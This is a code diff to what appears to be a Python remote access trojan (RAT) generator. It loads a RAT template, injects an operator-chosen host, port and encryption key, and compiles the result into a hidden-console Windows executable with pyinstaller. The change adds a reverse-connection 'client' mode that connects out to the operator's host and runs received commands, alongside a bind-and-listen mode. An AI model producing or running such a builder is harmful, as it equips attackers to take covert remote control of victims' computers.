@@ -1,8 +1,7 @@
 from colorama import Fore
 from platform import system as OStype
-from os import getcwd
 from cryptography.fernet import Fernet
-from os import system,chdir
+from os import system,chdir,getcwd
 from os.path import isdir
 def clear():
     if "windows" in OStype().lower():
@@ -11,12 +10,12 @@ def clear():
         system("clear")
 def rgb(r, g, b):
     return "\033[38;2;{};{};{}m".format(r, g, b)
-def main():
+def main(mode):
     clear()
     if 'windows' in OStype():
-        code =open(f'{getcwd()}\\tools\\RATS\\RAT01.py','r')
+        code =open(f'{getcwd()}\\tools\\RATS\\RAT.py','r')
     else :
-        code =open(f'{getcwd()}/tools/RATS/RAT01.py','r')
+        code =open(f'{getcwd()}/tools/RATS/RAT.py','r')
     mainCode=code.read()
     selection=input(f"""
 {rgb(255, 51, 51)}  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
@@ -33,10 +32,10 @@ def main():
 
 Enter your selection : """)
     if selection == '1':
-        host=input(f"{rgb(255, 213, 128)}\n\n[ * ] Enter the target host : {Fore.RESET}")
+        host=input(f"{rgb(255, 213, 128)}\n\n[ * ] Enter the host : {Fore.RESET}")
         while 1:
             try:
-                port=int(input(f"{rgb(255, 213, 128)}\n[ * ] Enter the target port to bind : {Fore.RESET}"))
+                port=int(input(f"{rgb(255, 213, 128)}\n[ * ] Enter the port : {Fore.RESET}"))
                 break
             except ValueError : 
                 print(f"{Fore.LIGHTRED_EX}\n\n[ ! ] Value Error")
@@ -53,34 +52,50 @@ Enter your selection : """)
                 break
             else :
                 print(f"{Fore.LIGHTRED_EX}\n[ ! ] Value Error")
-        mainFunc=f'''
-
-def main():   
+        if mode=='client':
+            mainFunc=f'''
+def main():
     addrs=("{host}",{port})   
     key=b'{key.decode()}'
     sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-    sock.bind(addrs)
-    sock.listen(1)
+    sock.connect(addrs)
     while 1:
-        conn,addr=sock.accept()
-        command=conn.recv(1024).decode()
-        try:
-            commandRunner(conn,command,key)
-        except :
-            pass
+        command=sock.recv(1024).decode()
+        if command :
+            commandRunner(sock,command,key)
 while 1:
     try:
         main()
     except : 
         pass
-    '''
+        '''
+        elif mode=='server':
+            mainFunc=f'''
+def main():      
+    addrs=("{host}",{port})   
+    key=b'{key.decode()}'
+    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    sock.bind(addrs)
+    sock.listen(1)
+    conn,addr=sock.accept()
+    while 1:
+        command=conn.recv(1024).decode()
+        commandRunner(conn,command,key)
+while 1:
+    try:
+        main()
+    except : 
+        pass
+        '''
         mainCode+=mainFunc
+        currPath=getcwd()
         chdir(pathToSave)
         with open('pyRAT.pyw','w') as pyFile:
             pyFile.write(mainCode)
             pyFile.close()
-        system(f"pyinstaller --onefile {'pyRAT.pyw'}")
+        system(f"pyinstaller --onefile pyRAT.pyw")
         clear()
+        chdir(currPath)
         input(f"{rgb(0,255,0)}[ * ] Done (The executable file for windows is located in the /dist path)! \n\nEnter to continue : {Fore.RESET}")
     elif selection=='2':
         return 1
